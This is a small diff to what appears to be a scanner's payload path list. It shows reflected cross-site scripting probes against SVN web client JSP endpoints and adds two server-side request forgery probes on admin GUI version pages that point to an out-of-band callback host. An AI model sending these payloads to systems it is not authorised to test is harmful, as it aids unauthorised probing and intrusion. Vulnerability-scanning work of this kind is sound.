@@ -85,3 +85,5 @@
 /plugins/servlet/svnwebclient/commitGraph.jsp?url=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
 /plugins/servlet/svnwebclient/error.jsp?errormessage=%27%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&description=test
 /plugins/servlet/svnwebclient/statsItem.jsp?url=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
+/admingui/version/Version?productNameSrc=http://{{interactsh-url}}/test.jpg&productNameHeight=500&productNameWidth=500
+/admingui/version/Masthead.jsp?productNameSrc=http://{{interactsh-url}}/test.jpg&productNameHeight=500&productNameWidth=500
